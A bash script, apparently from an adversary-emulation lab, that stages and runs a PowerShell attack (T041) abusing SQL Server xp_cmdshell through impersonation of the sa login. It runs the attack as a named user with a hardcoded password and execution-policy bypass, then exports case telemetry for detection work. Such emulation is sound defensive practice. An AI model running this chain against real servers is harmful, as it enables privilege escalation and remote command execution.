#!/usr/bin/env bash
# T041 — xp_cmdshell via SQL from ws01 (analyst_t1 → IMPERSONATE sa)
set -euo pipefail
source "$(dirname "$0")/../lib/campaign-a-common.sh"

CASE_ID="CADRE-T041-XPCMD-${CASE_DATE:-$(date -u +%Y%m%d)}-ws01"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)
MBR01="${MBR01:-192.168.77.22}"
PS1_LOCAL="${CAMPAIGN_A_LIB}/../windows/campaign-a-t041-xpcmd.ps1"
echo "=== T041 | ${CASE_ID} | T0=${T0} ==="

bash "${CAMPAIGN_A_LIB}/ws01-stage-file.sh" "${PS1_LOCAL}" "campaign-a-t041-xpcmd.ps1"
ws01_exec_as analyst_t1 'T13r_An@lyst!' \
  "powershell -NoProfile -ExecutionPolicy Bypass -File C:\\Tools\\cadre-attack\\campaign-a-t041-xpcmd.ps1 -Server ${MBR01}"

cadre_export "${CASE_ID}" T041 "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
